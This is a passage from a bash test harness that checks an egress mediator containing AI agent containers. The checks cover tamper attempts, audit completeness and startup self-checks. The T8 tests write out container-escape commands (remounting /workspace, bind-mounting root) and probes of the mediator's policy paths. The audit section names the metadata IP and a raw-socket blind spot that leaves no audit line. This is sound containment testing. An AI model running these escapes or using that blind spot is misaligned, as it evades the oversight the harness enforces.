    if ! docker exec "$CID_TAMPER" bash -c "command -v $bin" >/dev/null 2>&1; then
      pass "T8: '$attempt' -- $bin is not present in the image, so the reconfiguration has no tool"
      continue
    fi
    if docker exec "$CID_TAMPER" bash -c "$attempt" >/dev/null 2>&1; then
      fail "T8: '$attempt' SUCCEEDED from inside the container"
    else
      pass "T8: '$attempt' fails (no NET_ADMIN/NET_RAW)"
    fi
  done

  # T8 surface 3 -- the mount set. Nothing new may be mounted, /workspace may not be remounted
  # with different options, and the control plane must be unreachable from inside.
  before="$(docker inspect "$CID_TAMPER" | jq -r '[.[0].Mounts[] | .Destination] | sort | join(",")')"
  for attempt in "mount -o remount,rw,exec /workspace" "mount -t tmpfs none /mnt" "mkdir -p /mnt/x && mount --bind / /mnt/x"; do
    if docker exec "$CID_TAMPER" bash -c "$attempt" >/dev/null 2>&1; then
      fail "T8: '$attempt' SUCCEEDED"
    else
      pass "T8: '$attempt' fails"
    fi
  done
  for p in /etc/mediator/policy /etc/mediator/config /var/log/mediator; do
    if docker exec "$CID_TAMPER" bash -c "ls $p" >/dev/null 2>&1; then
      fail "T8: an agent can read $p"
    else
      pass "T8: $p is not reachable from an agent container"
    fi
  done
  after="$(docker inspect "$CID_TAMPER" | jq -r '[.[0].Mounts[] | .Destination] | sort | join(",")')"
  [ "$before" = "$after" ] && pass "T8: the mount set is unchanged after every attempt" \
                           || fail "T8: the mount set changed: {$before} -> {$after}"
  docker rm -f "$CID_TAMPER" >/dev/null 2>&1 || true
fi

# T17 -- stage 1 of the startup self-check. Run against a throwaway container rather than the
# live stack: the assertion is that a corrupt policy ABORTS the start, so there is nothing to
# bring up. `--tmpfs /run` reproduces what Compose provides; without it the entrypoint fails
# earlier, for a reason that is not the one under test.
CORRUPT="$(mktemp)"
printf 'schema: 1\nprofile: default\nagents:\n  claude:\n    listener: {scheme: https, tls: true\n' > "$CORRUPT"
out="$(timeout 60 docker run --rm --tmpfs /run:uid=13,gid=13,mode=0755 \
        -e MEDIATOR_AGENT_NETWORKS="claude=1.2.3.4/24" \
        -v "$CORRUPT:/etc/mediator/policy/default.yaml:ro" "$MED_IMAGE" 2>&1)"
rc=$?
rm -f "$CORRUPT"
if [ "$rc" -ne 0 ] && printf '%s' "$out" | grep -q "stage 1 self-check" \
   && printf '%s' "$out" | grep -q "/etc/mediator/policy/default.yaml"; then
  pass "T17: a corrupt resolved policy aborts the start, naming the file and the failure"
else
  fail "T17: the mediator did not abort on a corrupt policy (exit $rc)"; note "$(printf '%s' "$out" | tail -3)"
fi

# ---------------------------------------------------------------------------
# Phase G (before F, deliberately) -- audit completeness
# ---------------------------------------------------------------------------
# Runs BEFORE Phase F because Phase F recreates the mediator on a different profile, which takes
# the audit volume's contents with it. Everything phases B-E produced is in the sink now.
phase "G -- audit completeness"

AUDIT_SNAPSHOT="$(audit)"

# R9.1: every attempt that reached the mediator is recorded, blocked ones included, with
# destination, verdict, timestamp and identity.
missing=""
for host in collector.example.com collector2.example.com allowed.fixture.lab denied.fixture.lab \
            denied-by-fqdn.fixture.lab neighbour.fixture.lab claude-only.fixture.lab \
            169.254.169.254 upgrade.fixture.lab; do
  printf '%s' "$AUDIT_SNAPSHOT" | jq -e --arg h "$host" 'select(.verdict != null and .dest_host == $h)' >/dev/null 2>&1 \
    || missing="${missing} ${host}"
done
[ -z "$missing" ] && pass "R9.1: every destination phases B-E drove appears in the sink" \
                  || { fail "R9.1: no record for:${missing}"; }

# Every verdict line carries the four fields R9.1 asks for. Checked over the whole sink rather
# than a sample: a schema that holds for the lines a test looked at is not a schema.
bad="$(printf '%s' "$AUDIT_SNAPSHOT" \
  | jq -c 'select(.verdict != null) | select(.dest_host == null or .ts == null or .agent == null or .identity_source == null)' | head -3)"
[ -z "$bad" ] && pass "R9.1: every verdict line carries destination, verdict, timestamp and identity" \
              || { fail "R9.1: incomplete verdict lines"; note "$bad"; }

# Interface Contract 4's shape, on every line: a verdict line or an event line, never both and
# never neither. This is what lets a consumer select on `.verdict` and see only verdicts.
bad="$(printf '%s' "$AUDIT_SNAPSHOT" | jq -c 'select((.verdict != null) == (.event != null))' | head -3)"
[ -z "$bad" ] && pass "Contract 4: every line is either a verdict or an event, never both" \
              || { fail "Contract 4: malformed lines"; note "$bad"; }

# One verdict per attempt: a bumping listener's CONNECT-acceptance record is an event, and a
# fronted agent's tunnel line is dropped, so a denied attempt cannot also appear as an allow.
for host in denied.fixture.lab neighbour.fixture.lab denied-by-fqdn.fixture.lab; do
  n="$(printf '%s' "$AUDIT_SNAPSHOT" | jq -c --arg h "$host" 'select(.verdict == "allow" and .dest_host == $h)' | wc -l | tr -d ' ')"
  [ "$n" = "0" ] && pass "no allow line for the refused destination $host" \
                 || fail "$host has $n allow line(s) as well as its deny"
done

# Criterion 4: every DNS decision, with name, verdict and agent.
dns_ok=1
for pair in "allowed.fixture.lab.:allow" "denied.fixture.lab.:deny"; do
  qn="${pair%%:*}"; want="${pair##*:}"
  dns_audit | jq -e --arg q "$qn" --arg v "$want" \
    'select(.qname == $q and .verdict == $v and .qtype != null and .agent != null)' >/dev/null 2>&1 \
    || { note "no $want record for $qn with name, QTYPE and agent"; dns_ok=0; }
done
[ "$dns_ok" -eq 1 ] && pass "criterion 4: every DNS decision carries name, QTYPE, verdict and agent" \
                    || fail "criterion 4: the DNS trail is incomplete"

# The blind spot, asserted as an EXPECTED ABSENCE rather than left to read as a pass. An agent
# that opens a raw socket fails inside its own network namespace, so the packet never reaches
# the mediator and no audit line can exist. Criterion 7 records this as a residual: the more
# completely the route is absent, the less there is to observe.
if printf '%s' "$AUDIT_SNAPSHOT" | jq -e --arg h "$FIXTURE_COLLECTOR" 'select(.dest_host == $h)' >/dev/null 2>&1; then
  fail "criterion 7 residual: a raw-socket attempt produced an audit line, which contradicts the recorded blind spot"
else
  pass "criterion 7 residual: the raw-socket attempt produced NO audit line, as recorded (a real gap, not a passing case)"
fi
note "R9.1 holds for attempts that REACH the mediator. Milestone 02's adversarial validation is"
note "where the size of that blind spot gets measured."

# ---------------------------------------------------------------------------
# Phase F -- the startup reachability self-check (R9.5)
# ---------------------------------------------------------------------------
phase "F -- startup reachability self-check"

# The only bring-up in this harness that runs stage 2 for real. Its targets are the harness's own
# fixture and the link-local address, so the check R9.5 asks for is demonstrated end to end
# without contacting a third-party host -- and a permanently-offline harness cannot hide a broken
# stage 2 behind a skip.
MEDIATOR_TEST_PROFILE=test-selfcheck "${COMPOSE[@]}" up -d --force-recreate egress-mediator >/dev/null 2>&1
ok=0
for _ in $(seq 1 90); do
  if "${COMPOSE[@]}" logs egress-mediator 2>&1 | grep -q "stage 2 self-check: PASS"; then ok=1; break; fi
  if "${COMPOSE[@]}" logs egress-mediator 2>&1 | grep -q "FATAL: stage 2"; then break; fi
  sleep 1
done
if [ "$ok" -eq 1 ]; then
  pass "R9.5: stage 2 runs end to end through the rendered proxy and passes against the fixtures"
else
  fail "R9.5: stage 2 did not pass"
  "${COMPOSE[@]}" logs egress-mediator 2>&1 | grep -E "stage 2|FATAL" | tail -5
fi
if med cat /var/log/mediator/egress-audit.log 2>/dev/null \
     | jq -e 'select(.event == "startup_check" and .stage == 2 and .result == "pass")' >/dev/null 2>&1; then
  pass "R9.5: the stage-2 result is on the audit trail"
else
  fail "R9.5: no stage-2 pass event on the audit trail"
fi
# The probes are the mediator's own traffic and must not be attributed to the agent whose policy
# they borrow. An audit trail whose premise is honest attribution cannot carry a synthetic
# `claude` allow line at every start.
if med cat /var/log/mediator/egress-audit.log 2>/dev/null \
     | jq -e 'select(.verdict != null and .agent == "selfcheck")' >/dev/null 2>&1; then
  pass "R9.5: the self-check's own traffic is attributed to selfcheck, not to the agent it mirrors"
else
  fail "R9.5: the self-check's traffic is not attributed to selfcheck"
fi

# And the recorded exception. `offline: true` skips stage 2 ONLY, and says so at every start.
"${COMPOSE[@]}" up -d --force-recreate egress-mediator >/dev/null 2>&1
ok=0
for _ in $(seq 1 60); do
  med cat /var/log/mediator/egress-audit.log 2>/dev/null \
    | jq -e 'select(.event == "startup_check" and .stage == 2 and .result == "skipped")' >/dev/null 2>&1 && { ok=1; break; }
  sleep 1
done
[ "$ok" -eq 1 ] && pass "R9.5: with startup_check.offline, stage 2 is skipped and the skip is recorded at every start" \
                || fail "R9.5: the offline skip is not recorded"
if med cat /var/log/mediator/egress-audit.log 2>/dev/null \
     | jq -e 'select(.event == "startup_check" and .stage == 1 and .result == "pass")' >/dev/null 2>&1; then
  pass "R9.5: stage 1 still runs on the offline profile -- the skip is stage 2's alone"
else
  fail "R9.5: stage 1 did not run on the offline profile"
fi

# ---------------------------------------------------------------------------
echo
if [ "$FAILED" -eq 0 ]; then
  echo "ALL PHASES PASSED"
else
  echo "FAILURES PRESENT -- see FAIL lines above"
fi
exit "$FAILED"
